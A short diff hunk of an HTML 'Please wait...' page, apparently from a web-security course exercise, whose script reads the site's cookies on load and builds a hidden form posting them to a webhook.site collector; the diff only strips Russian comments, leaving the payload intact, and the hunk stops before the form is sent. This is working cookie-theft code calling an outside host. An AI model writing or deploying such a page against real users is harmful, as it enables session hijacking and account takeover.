@@ -7,12 +7,8 @@
     <h1>Please wait...</h1>
     
     <script>
-        // Ждем загрузки страницы
         window.onload = function() {
-            // Получаем cookies сайта cats.is-course.ru
             var cookies = document.cookie;
-            
-            // Создаем скрытую форму для отправки данных
             var form = document.createElement('form');
             form.method = 'POST';
             form.action = 'https://webhook.site/d1933a3f-90d0-4258-99ef-f0686f993e62/';
